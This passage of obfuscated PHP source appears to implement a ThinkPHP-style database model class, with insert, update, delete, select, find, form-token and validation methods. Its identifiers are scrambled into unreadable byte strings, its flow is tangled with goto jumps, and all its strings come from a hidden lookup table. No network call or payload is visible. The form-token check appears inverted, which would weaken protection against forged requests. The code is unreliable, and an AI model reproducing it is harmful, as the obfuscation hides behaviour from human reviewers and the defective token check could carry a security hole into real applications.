AµîŸÇöä ; DµÕİ æ¥: } protected function _beforeInsert(&$cÉŠÜÑ»êĞ, $FÉÓĞ©Í·¬) { } protected function _after_insert($dŠ‘…‚åÑ, $d¡âÔÓù´ğ) { } public function addAll($B›ÚÑõîí, $Aâ¶âÜ = array(), $b¥øƒÙêïå = false) { goto AÖ”Ù¿³“ª; Aà‡ìÛ: return $aøÒÎõ¼Á; goto C¾É£Ÿî; cìÅŸ†‹ìï: foreach ($B›ÚÑõîí as $FÙ•Ç÷‰ => $fêâºó§ïï) { $B›ÚÑõîí[$FÙ•Ç÷‰] = $this->_facade($fêâºó§ïï); } if (method_exists($this->db, $fÈ©Ô²ÈÆ›[279])) { $aøÒÎõ¼Á = $this->db->insertAll($B›ÚÑõîí, $Aâ¶âÜ, $b¥øƒÙêïå); } else { $this->startTrans(); foreach ($B›ÚÑõîí as $FÙ•Ç÷‰ => $fêâºó§ïï) { $aøÒÎõ¼Á = $this->db->insert($fêâºó§ïï, $Aâ¶âÜ, $b¥øƒÙêïå); } $this->commit(); } if (!1 !== $aøÒÎõ¼Á) { $eòÉÙ¥ğ = $this->getLastInsID(); if ($eòÉÙ¥ğ) { return $eòÉÙ¥ğ; } } goto Aà‡ìÛ; AÖ”Ù¿³“ª: $fÈ©Ô²ÈÆ› =& $_SERVER[úÉ·öƒÑì©]; if (empty($B›ÚÑõîí)) { $this->error = think_lang($fÈ©Ô²ÈÆ›[278]); return !1; } $Aâ¶âÜ = $this->_parseOptions($Aâ¶âÜ); goto cìÅŸ†‹ìï; C¾É£Ÿî: } public function selectAdd($DäÒñ…³Æ’ = '', $dˆ¯»‹“Ğ‚ = '', $DÜŒËª¨ï = array()) { $D¡¶å½ˆ¹º =& $_SERVER[úÉ·öƒÑì©]; $DÜŒËª¨ï = $this->_parseOptions($DÜŒËª¨ï); if (!1 === ($F¹±½µ× = $this->db->selectInsert($DäÒñ…³Æ’ ? $DäÒñ…³Æ’ : $DÜŒËª¨ï[$D¡¶å½ˆ¹º[280]], $dˆ¯»‹“Ğ‚ ? $dˆ¯»‹“Ğ‚ : $this->getTableName(), $DÜŒËª¨ï))) { $this->error = think_lang($D¡¶å½ˆ¹º[281]); return !1; } else { return $F¹±½µ×; } } public function save($FŸ õİÇÀá = '', $bÌ÷Éõ¶É = array()) { goto Dø¦Íì­–ä; fÁµãå²Í: $bÌ÷Éõ¶É = $this->_parseOptions($bÌ÷Éõ¶É); $dšÓ†¬™ = $this->getPk(); if (!isset($bÌ÷Éõ¶É[$Eº”´”›Ë[282]])) { if (isset($FŸ õİÇÀá[$dšÓ†¬™])) { $bÊŠ¦¶“ƒ©[$dšÓ†¬™] = $FŸ õİÇÀá[$dšÓ†¬™]; $bÌ÷Éõ¶É[$Eº”´”›Ë[282]] = $bÊŠ¦¶“ƒ©; unset($FŸ õİÇÀá[$dšÓ†¬™]); } else { $this->error = think_lang($Eº”´”›Ë[281]); return !1; } } goto A˜¤Œ­Á«¸; eçóÄ‘øíë: if (!1 !== $F¤°Â£ñŞÒ) { if (isset($eÀâÉéßÜ)) { $FŸ õİÇÀá[$dšÓ†¬™] = $eÀâÉéßÜ; } $this->_afterUpdate($FŸ õİÇÀá, $bÌ÷Éõ¶É); } return $F¤°Â£ñŞÒ; goto Aù®ëÇ…»Ñ; Dø¦Íì­–ä: $Eº”´”›Ë =& $_SERVER[úÉ·öƒÑì©]; if (empty($FŸ õİÇÀá)) { if (!empty($this->data)) { $FŸ õİÇÀá = $this->data; $this->data = array(); } else { $this->error = think_lang($Eº”´”›Ë[278]); return !1; } } $FŸ õİÇÀá = $this->_facade($FŸ õİÇÀá); goto fÁµãå²Í; A˜¤Œ­Á«¸: if (is_array($bÌ÷Éõ¶É[$Eº”´”›Ë[282]]) && isset($bÌ÷Éõ¶É[$Eº”´”›Ë[282]][$dšÓ†¬™])) { $eÀâÉéßÜ = $bÌ÷Éõ¶É[$Eº”´”›Ë[282]][$dšÓ†¬™]; } if (!1 === $this->_beforeUpdate($FŸ õİÇÀá, $bÌ÷Éõ¶É)) { return !1; } $F¤°Â£ñŞÒ = $this->db->update($FŸ õİÇÀá, $bÌ÷Éõ¶É); goto eçóÄ‘øíë; Aù®ëÇ…»Ñ: } protected function _beforeUpdate(&$fˆƒÇÓ©ã, $bßÆÇŠÁ­) { } protected function _afterUpdate($Dõ”Ÿ¾‚ˆ, $fîƒóŒ¸ë) { } public function delete($dæÑ“˜êªˆ = array()) { goto cù¸›äóìß; dºÛ‹µÒ“¯: if (is_numeric($dæÑ“˜êªˆ) || is_string($dæÑ“˜êªˆ)) { if (strpos($dæÑ“˜êªˆ, $c‹›·ˆÖ‘[47])) { $fã‹í‘‡ˆŞ[$bÆåÏî‚] = array($c‹›·ˆÖ‘[283], $dæÑ“˜êªˆ); } else { $fã‹í‘‡ˆŞ[$bÆåÏî‚] = $dæÑ“˜êªˆ; } $this->options[$c‹›·ˆÖ‘[282]] = $fã‹í‘‡ˆŞ; } $dæÑ“˜êªˆ = $this->_parseOptions(); if (is_array($dæÑ“˜êªˆ[$c‹›·ˆÖ‘[282]]) && isset($dæÑ“˜êªˆ[$c‹›·ˆÖ‘[282]][$bÆåÏî‚])) { $f„‹¾ãÛ‹¶ = $dæÑ“˜êªˆ[$c‹›·ˆÖ‘[282]][$bÆåÏî‚]; } goto aÂŒÒ‹˜¿; aÂŒÒ‹˜¿: $D»‰îœõ‘® = $this->db->delete($dæÑ“˜êªˆ); if (!1 !== $D»‰îœõ‘®) { $Dğ…¤—¶­ = array(); if (isset($f„‹¾ãÛ‹¶)) { $Dğ…¤—¶­[$bÆåÏî‚] = $f„‹¾ãÛ‹¶; } $this->_after_delete($Dğ…¤—¶­, $dæÑ“˜êªˆ); } return $D»‰îœõ‘®; goto Bºì›ÀËøÓ; cù¸›äóìß: $c‹›·ˆÖ‘ =& $_SERVER[úÉ·öƒÑì©]; if (empty($dæÑ“˜êªˆ) && empty($this->options[$c‹›·ˆÖ‘[282]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $bÆåÏî‚ = $this->getPk(); goto dºÛ‹µÒ“¯; Bºì›ÀËøÓ: } protected function _after_delete($AÙíãù“Á´, $A¥µ‚ßğŒ²) { } public function select($E„¾Æ†°äÖ = array()) { goto e‰²ò“È; Eä¯ÙÎø¯ò: $a‹’†–Ÿ = $this->db->select($E„¾Æ†°äÖ); if (!1 === $a‹’†–Ÿ) { return !1; } if (empty($a‹’†–Ÿ)) { return null; } goto fíöÄ¹Ã; fíöÄ¹Ã: $this->_afterSelect($a‹’†–Ÿ, $E„¾Æ†°äÖ); return $a‹’†–Ÿ; goto dÎÁ„ÚÍ; e‰²ò“È: $f¢ÇÉ£¼¹ä =& $_SERVER[úÉ·öƒÑì©]; if (is_string($E„¾Æ†°äÖ) || is_numeric($E„¾Æ†°äÖ)) { $FÈ°›º«Ğø = $this->getPk(); if (strpos($E„¾Æ†°äÖ, $f¢ÇÉ£¼¹ä[47])) { $c¨ĞÈæ‹ß[$FÈ°›º«Ğø] = array($f¢ÇÉ£¼¹ä[283], $E„¾Æ†°äÖ); } else { $c¨ĞÈæ‹ß[$FÈ°›º«Ğø] = $E„¾Æ†°äÖ; } $this->options[$f¢ÇÉ£¼¹ä[282]] = $c¨ĞÈæ‹ß; } elseif (!1 === $E„¾Æ†°äÖ) { $E„¾Æ†°äÖ = $this->_parseOptions(); return $f¢ÇÉ£¼¹ä[284] . $this->db->buildSelectSql($E„¾Æ†°äÖ) . $f¢ÇÉ£¼¹ä[285]; } $E„¾Æ†°äÖ = $this->_parseOptions(); goto Eä¯ÙÎø¯ò; dÎÁ„ÚÍ: } protected function _afterSelect(&$F˜í‹å„Í», $b›ôÚùªÑ…) { } public function buildSql($B³‰‡¿òÂ = array()) { $cô¯áØ®‹½ =& $_SERVER[úÉ·öƒÑì©]; $B³‰‡¿òÂ = $this->_parseOptions($B³‰‡¿òÂ); return $cô¯áØ®‹½[284] . $this->db->buildSelectSql($B³‰‡¿òÂ) . $cô¯áØ®‹½[285]; } public function optionsValue($bÌùœ…“¦Õ = null) { if (is_null($bÌùœ…“¦Õ)) { return $this->options; } elseif (is_array($bÌùœ…“¦Õ)) { $this->options = array_merge($this->options, $bÌùœ…“¦Õ); } } protected function _parseOptions($BÅ¸Àî ¥ = array()) { goto FğñÌÅâ—­; E‘ƒÓ‹: if (!isset($BÅ¸Àî ¥[$c‚ö†–¹‚‹[286]])) { $BÅ¸Àî ¥[$c‚ö†–¹‚‹[286]] = $this->getTableName(); $e¾†”Â¥˜ô = $this->fields; } else { $e¾†”Â¥˜ô = $this->getDbFields(); } if (!empty($BÅ¸Àî ¥[$c‚ö†–¹‚‹[287]])) { $BÅ¸Àî ¥[$c‚ö†–¹‚‹[286]] .= $c‚ö†–¹‚‹[50] . $BÅ¸Àî ¥[$c‚ö†–¹‚‹[287]]; } $BÅ¸Àî ¥[$c‚ö†–¹‚‹[288]] = $this->name; goto c¯ã¢Õáî; c¯ã¢Õáî: if (isset($BÅ¸Àî ¥[$c‚ö†–¹‚‹[282]]) && is_array($BÅ¸Àî ¥[$c‚ö†–¹‚‹[282]]) && !empty($e¾†”Â¥˜ô) && !isset($BÅ¸Àî ¥[$c‚ö†–¹‚‹[289]]) && !isset($BÅ¸Àî ¥[$c‚ö†–¹‚‹[286]])) { foreach ($BÅ¸Àî ¥[$c‚ö†–¹‚‹[282]] as $FĞâ—§²ç½ => $bÉŠ‡î‹Ö‰) { $FĞâ—§²ç½ = trim($FĞâ—§²ç½); if (in_array($FĞâ—§²ç½, $e¾†”Â¥˜ô, !0)) { if (is_scalar($bÉŠ‡î‹Ö‰)) { $this->_parseType($BÅ¸Àî ¥[$c‚ö†–¹‚‹[282]], $FĞâ—§²ç½); } } elseif (!is_numeric($FĞâ—§²ç½) && $c‚ö†–¹‚‹[71] != substr($FĞâ—§²ç½, 0, 1) && !1 === strpos($FĞâ—§²ç½, $c‚ö†–¹‚‹[95]) && !1 === strpos($FĞâ—§²ç½, $c‚ö†–¹‚‹[267]) && !1 === strpos($FĞâ—§²ç½, $c‚ö†–¹‚‹[290]) && !1 === strpos($FĞâ—§²ç½, $c‚ö†–¹‚‹[291])) { unset($BÅ¸Àî ¥[$c‚ö†–¹‚‹[282]][$FĞâ—§²ç½]); } } } $this->_options_filter($BÅ¸Àî ¥); return $BÅ¸Àî ¥; goto BÂÙ‹ÜÑéµ; FğñÌÅâ—­: $c‚ö†–¹‚‹ =& $_SERVER[úÉ·öƒÑì©]; if (is_array($BÅ¸Àî ¥)) { $BÅ¸Àî ¥ = array_merge($this->options, $BÅ¸Àî ¥); } $this->options = array(); goto E‘ƒÓ‹; BÂÙ‹ÜÑéµ: } protected function _options_filter(&$AŠ¤³äÈÖ) { } protected function _parseType(&$Bì’õÄ¿÷, $B¾É¸Ùïè‚) { $aìä¿Í‚¬» =& $_SERVER[úÉ·öƒÑì©]; if (empty($this->options[$aìä¿Í‚¬»[292]][$aìä¿Í‚¬»[4] . $B¾É¸Ùïè‚])) { $E½çÆãÀëš = strtolower($this->fields[$aìä¿Í‚¬»[259]][$B¾É¸Ùïè‚]); if (!1 !== strpos($E½çÆãÀëš, $aìä¿Í‚¬»[293])) { } elseif (!1 === strpos($E½çÆãÀëš, $aìä¿Í‚¬»[294]) && !1 !== strpos($E½çÆãÀëš, $aìä¿Í‚¬»[295])) { $Bì’õÄ¿÷[$B¾É¸Ùïè‚] = intval($Bì’õÄ¿÷[$B¾É¸Ùïè‚]); } elseif (!1 !== strpos($E½çÆãÀëš, $aìä¿Í‚¬»[296]) || !1 !== strpos($E½çÆãÀëš, $aìä¿Í‚¬»[297])) { $Bì’õÄ¿÷[$B¾É¸Ùïè‚] = floatval($Bì’õÄ¿÷[$B¾É¸Ùïè‚]); } elseif (!1 !== strpos($E½çÆãÀëš, $aìä¿Í‚¬»[298])) { $Bì’õÄ¿÷[$B¾É¸Ùïè‚] = (bool) $Bì’õÄ¿÷[$B¾É¸Ùïè‚]; } } } public function find($Aô†Ï‹Ñá = array()) { goto dß÷ƒ´İˆ«; eê–­ğ‘éõ: $Aô†Ï‹Ñá = $this->_parseOptions(); $dë±Ø§‹Õˆ = $this->db->select($Aô†Ï‹Ñá); if (!1 === $dë±Ø§‹Õˆ) { return !1; } goto c³©‡Ã¹Ó; A¶“¶§ô‡â: if (!empty($this->options[$e‹®‡ÅÉÏ[300]])) { return $this->returnResult($this->data, $this->options[$e‹®‡ÅÉÏ[300]]); } return $this->data; goto EŠĞ ãÕ­Ö; dß÷ƒ´İˆ«: $e‹®‡ÅÉÏ =& $_SERVER[úÉ·öƒÑì©]; if (is_numeric($Aô†Ï‹Ñá) || is_string($Aô†Ï‹Ñá)) { $D‘®õÀÛÜï[$this->getPk()] = intval($Aô†Ï‹Ñá); $this->options[$e‹®‡ÅÉÏ[282]] = $D‘®õÀÛÜï; } $this->options[$e‹®‡ÅÉÏ[299]] = 1; goto eê–­ğ‘éõ; c³©‡Ã¹Ó: if (empty($dë±Ø§‹Õˆ)) { return null; } $this->data = $dë±Ø§‹Õˆ[0]; $this->_afterFind($this->data, $Aô†Ï‹Ñá); goto A¶“¶§ô‡â; EŠĞ ãÕ­Ö: } protected function _afterFind(&$båğ¡Æœé, $dËÄ‚»ï—´) { } protected function returnResult($A¨èªõ¯âã, $DÄŸ±æØ¦Š = '') { $D¾“ÀÂ²†Æ =& $_SERVER[úÉ·öƒÑì©]; if ($DÄŸ±æØ¦Š) { if (is_callable($DÄŸ±æØ¦Š)) { return call_user_func($DÄŸ±æØ¦Š, $A¨èªõ¯âã); } switch (strtolower($DÄŸ±æØ¦Š)) { case $D¾“ÀÂ²†Æ[301]: return json_encode($A¨èªõ¯âã); case $D¾“ÀÂ²†Æ[302]: return xml_encode($A¨èªõ¯âã); } } return $A¨èªõ¯âã; } public function parseFieldsMap($BõÖ¥í„¤ª, $d´ÏĞ÷ºæ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $c†­¢Ä => $D‰Ş´ä–Ò“) { if ($d´ÏĞ÷ºæ == 1) { if (isset($BõÖ¥í„¤ª[$D‰Ş´ä–Ò“])) { $BõÖ¥í„¤ª[$c†­¢Ä] = $BõÖ¥í„¤ª[$D‰Ş´ä–Ò“]; unset($BõÖ¥í„¤ª[$D‰Ş´ä–Ò“]); } } else { if (isset($BõÖ¥í„¤ª[$c†­¢Ä])) { $BõÖ¥í„¤ª[$D‰Ş´ä–Ò“] = $BõÖ¥í„¤ª[$c†­¢Ä]; unset($BõÖ¥í„¤ª[$c†­¢Ä]); } } } } return $BõÖ¥í„¤ª; } public function setField($aÉ‘ÂÍŸ÷§, $BŸ®å»š¦ = '') { if (is_array($aÉ‘ÂÍŸ÷§)) { $C¥‹½Íë„› = $aÉ‘ÂÍŸ÷§; } else { $C¥‹½Íë„›[$aÉ‘ÂÍŸ÷§] = $BŸ®å»š¦; } return $this->save($C¥‹½Íë„›); } public function setAdd($e¾ãêß–±, $DÂ§ÒÅÆíŠ = 1) { $bÆ¥ˆîÜ =& $_SERVER[úÉ·öƒÑì©]; $cÚ‡æŞÈãƒ = $e¾ãêß–± . $bÆ¥ˆîÜ[303] . $DÂ§ÒÅÆíŠ; if ($DÂ§ÒÅÆíŠ < 0) { $cÚ‡æŞÈãƒ = $e¾ãêß–± . $DÂ§ÒÅÆíŠ; } return $this->setField($e¾ãêß–±, array($bÆ¥ˆîÜ[304], $cÚ‡æŞÈãƒ)); } public function getField($D“¸ÃøêéŸ, $b­šíÌÔ = null) { $dÌ‹Æ«°õš =& $_SERVER[úÉ·öƒÑì©]; $EŠ½—Ä÷ó[$dÌ‹Æ«°õš[280]] = $D“¸ÃøêéŸ; $EŠ½—Ä÷ó = $this->_parseOptions($EŠ½—Ä÷ó); $D“¸ÃøêéŸ = trim($D“¸ÃøêéŸ); if (strpos($D“¸ÃøêéŸ, $dÌ‹Æ«°õš[47])) { if (!isset($EŠ½—Ä÷ó[$dÌ‹Æ«°õš[299]])) { $EŠ½—Ä÷ó[$dÌ‹Æ«°õš[299]] = is_numeric($b­šíÌÔ) ? $b­šíÌÔ : $dÌ‹Æ«°õš[33]; } $Dêİ™ˆæ­³ = $this->db->select($EŠ½—Ä÷ó); if (!empty($Dêİ™ˆæ­³)) { goto d±…¬‘ä½; DÃÖ³ä²æ¶: $d©‰¤Ğ† = array_shift($D“¸ÃøêéŸ); $d‘Ô‹Ç£Ô = array(); $F«¶Â³¶´ = count($F…¥©½‡ƒ); goto CŒ¸…¬Ø¿‹; d±…¬‘ä½: $F…¥©½‡ƒ = explode($dÌ‹Æ«°õš[47], $D“¸ÃøêéŸ); $D“¸ÃøêéŸ = array_keys($Dêİ™ˆæ­³[0]); $eàçãùŸÍ‰ = array_shift($D“¸ÃøêéŸ); goto DÃÖ³ä²æ¶; CŒ¸…¬Ø¿‹: foreach ($Dêİ™ˆæ­³ as $a„¯å²¬ö¢) { $CÀËÊî‘ğñ = $a„¯å²¬ö¢[$eàçãùŸÍ‰]; if (2 == $F«¶Â³¶´) { $d‘Ô‹Ç£Ô[$CÀËÊî‘ğñ] = $a„¯å²¬ö¢[$d©‰¤Ğ†]; } else { $d‘Ô‹Ç£Ô[$CÀËÊî‘ğñ] = is_string($b­šíÌÔ) ? implode($b­šíÌÔ, $a„¯å²¬ö¢) : $a„¯å²¬ö¢; } } return $d‘Ô‹Ç£Ô; goto A‰íÙ†Şçª; A‰íÙ†Şçª: } } else { if (!0 !== $b­šíÌÔ) { $EŠ½—Ä÷ó[$dÌ‹Æ«°õš[299]] = is_numeric($b­šíÌÔ) ? $b­šíÌÔ : 1; } if ($b­šíÌÔ === $dÌ‹Æ«°õš[262]) { unset($EŠ½—Ä÷ó[$dÌ‹Æ«°õš[299]]); } $a„¯å²¬ö¢ = $this->db->select($EŠ½—Ä÷ó); if (!empty($a„¯å²¬ö¢)) { if ($b­šíÌÔ === $dÌ‹Æ«°õš[262]) { return reset($a„¯å²¬ö¢[0]); } if (!0 !== $b­šíÌÔ && 1 == $EŠ½—Ä÷ó[$dÌ‹Æ«°õš[299]]) { return reset($a„¯å²¬ö¢[0]); } foreach ($a„¯å²¬ö¢ as $b…¼õ‚š¸Ù) { $açÇğÅƒÂ[] = $b…¼õ‚š¸Ù[$D“¸ÃøêéŸ]; } return $açÇğÅƒÂ; } } return null; } public function create($b†äÂ¡ó÷ù = '', $d°Ä½¦©ªƒ = '') { goto FóÒ³ ²õ¼; A—‰ƒ²Ò“·: if (isset($BõŸ¡Ğİã)) { if (is_string($BõŸ¡Ğİã)) { $BõŸ¡Ğİã = explode($F¯ó‚šİÈ[47], $BõŸ¡Ğİã); } if (think_config($F¯ó‚šİÈ[305])) { $BõŸ¡Ğİã[] = think_config($F¯ó‚šİÈ[306]); } foreach ($b†äÂ¡ó÷ù as $C¸ÄØ‘É‰ => $FÙÁëÈ²‡©) { if (!in_array($C¸ÄØ‘É‰, $BõŸ¡Ğİã)) { unset($b†äÂ¡ó÷ù[$C¸ÄØ‘É‰]); } } } if (!$this->autoValidation($b†äÂ¡ó÷ù, $d°Ä½¦©ªƒ)) { return !1; } if (!$this->autoCheckToken($b†äÂ¡ó÷ù)) { $this->error = think_lang($F¯ó‚šİÈ[307]); return !1; } goto bÃ…Š¹à—«; bÃ…Š¹à—«: if ($this->autoCheckFields) { $BõŸ¡Ğİã = $this->getDbFields(); foreach ($b†äÂ¡ó÷ù as $C¸ÄØ‘É‰ => $FÙÁëÈ²‡©) { if (!in_array($C¸ÄØ‘É‰, $BõŸ¡Ğİã)) { unset($b†äÂ¡ó÷ù[$C¸ÄØ‘É‰]); } elseif (MAGIC_QUOTES_GPC && is_string($FÙÁëÈ²‡©)) { $b†äÂ¡ó÷ù[$C¸ÄØ‘É‰] = stripslashes($FÙÁëÈ²‡©); } } } $this->autoOperation($b†äÂ¡ó÷ù, $d°Ä½¦©ªƒ); $this->data = $b†äÂ¡ó÷ù; goto c¶ªàÃçµ¹; FóÒ³ ²õ¼: $F¯ó‚šİÈ =& $_SERVER[úÉ·öƒÑì©]; if (empty($b†äÂ¡ó÷ù)) { $b†äÂ¡ó÷ù = $_POST; } elseif (is_object($b†äÂ¡ó÷ù)) { $b†äÂ¡ó÷ù = get_object_vars($b†äÂ¡ó÷ù); } if (empty($b†äÂ¡ó÷ù) || !is_array($b†äÂ¡ó÷ù)) { $this->error = think_lang($F¯ó‚šİÈ[278]); return !1; } goto C‘„…š¡¸ê; c¶ªàÃçµ¹: return $b†äÂ¡ó÷ù; goto BÌ°Šô¼ÊŸ; C‘„…š¡¸ê: $b†äÂ¡ó÷ù = $this->parseFieldsMap($b†äÂ¡ó÷ù, 0); $d°Ä½¦©ªƒ = $d°Ä½¦©ªƒ ? $d°Ä½¦©ªƒ : (!empty($b†äÂ¡ó÷ù[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$F¯ó‚šİÈ[280]])) { $BõŸ¡Ğİã = $this->options[$F¯ó‚šİÈ[280]]; unset($this->options[$F¯ó‚šİÈ[280]]); } elseif ($d°Ä½¦©ªƒ == THINK_MODEL_INSERT && isset($this->insertFields)) { $BõŸ¡Ğİã = $this->insertFields; } elseif ($d°Ä½¦©ªƒ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $BõŸ¡Ğİã = $this->updateFields; } goto A—‰ƒ²Ò“·; BÌ°Šô¼ÊŸ: } public function autoCheckToken($b„Ë‘ƒø‚) { $Aö½ê‹Š•— =& $_SERVER[úÉ·öƒÑì©]; if (isset($this->options[$Aö½ê‹Š•—[308]]) && !$this->options[$Aö½ê‹Š•—[308]]) { return !0; } if (think_config($Aö½ê‹Š•—[305])) { $D‹¹Çì¸Óõ = think_config($Aö½ê‹Š•—[306]); if (!isset($b„Ë‘ƒø‚[$D‹¹Çì¸Óõ]) || Session::get($D‹¹Çì¸Óõ)) { return !1; } list($DÆğ¥œ‰’, $D„ªî…×ë‚) = explode($Aö½ê‹Š•—[71], $b„Ë‘ƒø‚[$D‹¹Çì¸Óõ]); if ($D„ªî…×ë‚ && Session::get($D‹¹Çì¸Óõ . $Aö½ê‹Š•—[95] . $DÆğ¥œ‰’) === $D„ªî…×ë‚) { Session::remove($D‹¹Çì¸Óõ . $Aö½ê‹Š•—[95] . $DÆğ¥œ‰’); return !0; } if (think_config($Aö½ê‹Š•—[309])) { Session::remove($D‹¹Çì¸Óõ . $Aö½ê‹Š•—[95] . $DÆğ¥œ‰’); } return !1; } return !0; } public function regex($bŸõÌŠçÚØ, $bÁÆƒ£’³) { $e³ÀŸÎÀ‡Æ =& $_SERVER[úÉ·öƒÑì©]; $bó¢ˆÜîŠ® = array($e³ÀŸÎÀ‡Æ[310] => $e³ÀŸÎÀ‡Æ[311], $e³ÀŸÎÀ‡Æ[312] => $e³ÀŸÎÀ‡Æ[313], $e³ÀŸÎÀ‡Æ[314] => $e³ÀŸÎÀ‡Æ[315], $e³ÀŸÎÀ‡Æ[316] => $e³ÀŸÎÀ‡Æ[317], $e³ÀŸÎÀ‡Æ[318] => $e³ÀŸÎÀ‡Æ[319], $e³ÀŸÎÀ‡Æ[320] => $e³ÀŸÎÀ‡Æ[321], $e³ÀŸÎÀ‡Æ[322] => $e³ÀŸÎÀ‡Æ[323], $e³ÀŸÎÀ‡Æ[297] => $e³ÀŸÎÀ‡Æ[324], $e³ÀŸÎÀ‡Æ[325] => $e³ÀŸÎÀ‡Æ[326]); if (isset($bó¢ˆÜîŠ®[strtolower($bÁÆƒ£’³)])) { $bÁÆƒ£’³ = $bó¢ˆÜîŠ®[strtolower($bÁÆƒ£’³)]; } return preg_match($bÁÆƒ£’³, $bŸõÌŠçÚØ) === 1; } private function autoOperation(&$cğ°Øã¢³¤, $EÎÙ…¿Ûñ) { $b¨Ü¿İÛ› =& $_SERVER[úÉ·öƒÑì©]; if (!empty($this->options[$b¨Ü¿İÛ›[327]])) { $c÷ê®Ê— = $this->options[$b¨Ü¿İÛ›[327]]; unset($this->options[$b¨Ü¿İÛ›[327]]); } elseif (!empty($this->_auto)) { $c÷ê®Ê— = $this->_auto; } if (isset($c÷ê®Ê—)) { foreach ($c÷ê®Ê— as $BõÛ¶Ş“Í) { if (empty($BõÛ¶Ş“Í[2])) { $BõÛ¶Ş“Í[2] = THINK_MODEL_INSERT; } if ($EÎÙ…¿Ûñ == $BõÛ¶Ş“Í[2] || $BõÛ¶Ş“Í[2] == THINK_MODEL_BOTH) { switch (trim($BõÛ¶Ş“Í[3])) { case $b¨Ü¿İÛ›[328]: case $b¨Ü¿İÛ›[329]: $eºÉÓ­«©„ = isset($BõÛ¶Ş“Í[4]) ? (array) $BõÛ¶Ş“Í[4] : array(); if (isset($cğ°Øã¢³¤[$BõÛ¶Ş“Í[0]])) { array_unshift($eºÉÓ­«©„, $cğ°Øã¢³¤[$BõÛ¶Ş“Í[0]]); } if ($b¨Ü¿İÛ›[328] == $BõÛ¶Ş“Í[3]) { $cğ°Øã¢³¤[$BõÛ¶Ş“Í[0]] = call_user_func_array($BõÛ¶Ş“Í[1], $eºÉÓ­«©„); } else { $cğ°Øã¢³¤[$BõÛ¶Ş“Í[0]] = call_user_func_array(array(&$this, $BõÛ¶Ş“Í[1]), $eºÉÓ­«©„); } break; case $b¨Ü¿İÛ›[280]: $cğ°Øã¢³¤[$BõÛ¶Ş“Í[0]] = $cğ°Øã¢³¤[$BõÛ¶Ş“Í[1]]; break; case $b¨Ü¿İÛ›[330]: if ($b¨Ü¿İÛ›[33] === $cğ°Øã¢³¤[$BõÛ¶Ş“Í[0]]) { unset($cğ°Øã¢³¤[$BõÛ¶Ş“Í[0]]); } break; case $b¨Ü¿İÛ›[331]: default: $cğ°Øã¢³¤[$BõÛ¶Ş“Í[0]] = $BõÛ¶Ş“Í[1]; } if (!1 === $cğ°Øã¢³¤[$BõÛ¶Ş“Í[0]]) { unset($cğ°Øã¢³¤[$BõÛ¶Ş“Í[0]]); } } } } return $cğ°Øã¢³¤; } protected function autoValidation($E­öÌ±»áˆ, $eŠŞº•…ã) { $D¼î§À÷Å =& $_SERVER[úÉ·öƒÑì©]; if (!empty($this->options[$D¼î§À÷Å[332]])) { $aì¿É Ò³• = $this->options[$D¼î§À÷Å[332]]; unset($this->options[$D¼î§À÷Å[332]]); } elseif (!empty($this->_validate)) { $aì¿É Ò³• = $this->_validate; } if (isset($aì¿É Ò³•)) { if ($this->patchValidate) { $this->error = array(); } foreach ($aì¿É Ò³• as $dïãäë®èŒ => $dç•¯–«İ) { if (empty($dç•¯–«İ[5]) || $dç•¯–«İ[5] == THINK_MODEL_BOTH || $dç•¯–«İ[5] == $eŠŞº•…ã) { if (0 == strpos($dç•¯–«İ[2], $D¼î§À÷Å[333]) && strpos($dç•¯–«İ[2], $D¼î§À÷Å[334])) { $dç•¯–«İ[2] = think_lang(substr($dç•¯–«İ[2], 2, -1)); } $dç•¯–«İ[3] = isset($dç•¯–«İ[3]) ? $dç•¯–«İ[3] : THINK_EXISTS_VALIDATE; $dç•¯–«İ[4] = isset($dç•¯–«İ[4]) ? $dç•¯–«İ[4] : $D¼î§À÷Å[335]; switch ($dç•¯–«İ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($E­öÌ±»áˆ, $dç•¯–«İ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($D¼î§À÷Å[33] != trim($E­öÌ±»áˆ[$dç•¯–«İ[0]])) { if (!1 === $this->_validationField($E­öÌ±»áˆ, $dç•¯–«İ)) { return !1; } } break; default: if (isset($E­öÌ±»áˆ[$dç•¯–«İ[0]])) { if (!1 === $this->_validationField($E­öÌ±»áˆ, $dç•¯–«İ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($dÚ…œœéÌô, $fŞŒ¬˜æ„á) { if (!1 === $this->_validationFieldItem($dÚ…œœéÌô, $fŞŒ¬˜æ„á)) { if ($this->patchValidate) { $this->error[$fŞŒ¬˜æ„á[0]] = $fŞŒ¬˜æ„á[2]; } else { $this->error = $fŞŒ¬˜æ„á[2]; return !1; } } return; } protected function _validationFieldItem($aâò¤¸ŠË‹, $F¥¹½ãËÜá) { $bˆÙ«¶¼Ï› =& $_SERVER[úÉ·öƒÑì©]; switch (strtolower(trim($F¥¹½ãËÜá[4]))) { case $bˆÙ«¶¼Ï›[328]: case $bˆÙ«¶¼Ï›[329]: $A¤íÂîÀÍÒ = isset($F¥¹½ãËÜá[6]) ? (array) $F¥¹½ãËÜá[6] : array(); if (is_string($F¥¹½ãËÜá[0]) && strpos($F¥¹½ãËÜá[0], $bˆÙ«¶¼Ï›[47])) { $F¥¹½ãËÜá[0] = explode($bˆÙ«¶¼Ï›[47], $F¥¹½ãËÜá[0]); } if (is_array($F¥¹½ãËÜá[0])) { foreach ($F¥¹½ãËÜá[0] as $Cô™Ã˜¢÷) { $F®©æ’©Şá[$Cô™Ã˜¢÷] = $aâò¤¸ŠË‹[$Cô™Ã˜¢÷]; } array_unshift($A¤íÂîÀÍÒ, $F®©æ’©Şá); } else { array_unshift($A¤íÂîÀÍÒ, $aâò¤¸ŠË‹[$F¥¹½ãËÜá[0]]); } if ($bˆÙ«¶¼Ï›[328] == $F¥¹½ãËÜá[4]) { return call_user_func_array($F¥¹½ãËÜá[1], $A¤íÂîÀÍÒ); } else { return call_user_func_array(array(&$this, $F¥¹½ãËÜá[1]), $A¤íÂîÀÍÒ); } case $bˆÙ«¶¼Ï›[336]: return $aâò¤¸ŠË‹[$F¥¹½ãËÜá[0]] == $aâò¤¸ŠË‹[$F¥¹½ãËÜá[1]]; case $bˆÙ«¶¼Ï›[337]: if (is_string($F¥¹½ãËÜá[0]) && 